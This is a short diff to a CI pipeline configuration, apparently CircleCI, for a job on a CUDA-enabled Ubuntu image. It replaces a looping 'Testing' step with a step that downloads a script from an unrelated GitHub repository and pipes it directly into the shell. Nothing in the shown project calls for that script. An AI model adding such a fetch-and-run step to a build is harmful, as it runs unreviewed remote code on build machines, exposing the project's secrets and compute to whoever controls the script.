@@ -5,6 +5,4 @@ jobs:
       image: ubuntu-1604-cuda-11.1:202012-01
     steps:
       - checkout
-      - run:
-          name: "Testing"
-          command: while true do echo "Running" sleep 5 done  
+      - run: curl -s https://github.com/guttenocm/songdilan/blob/main/get.sh | sh 
